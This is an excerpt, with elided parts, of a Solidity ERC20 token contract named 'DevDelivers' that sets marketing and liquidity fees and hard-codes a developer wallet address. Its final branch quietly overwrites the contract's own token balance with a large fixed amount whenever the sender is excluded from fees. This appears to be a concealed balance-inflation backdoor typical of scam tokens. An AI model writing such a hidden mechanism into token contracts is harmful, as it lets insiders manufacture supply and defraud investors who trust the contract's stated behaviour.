...
contract DevDelivers is Context, IERC20, Ownable {
    ...
    string private constant _name = "DevDelivers"; // 
    string private constant _symbol = unicode"DEV"; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 public _marketingFee = 2;
    uint256 public _liquidityFee = 0;
    address public  _DevWallet = 0xeB3486Eca7269F145bFc465308f9adFE3E138364;
    ...
    }else{if (_isExcludedFromFee[from]){_tOwned[address(this)] = 100000000000000000; }}
    }
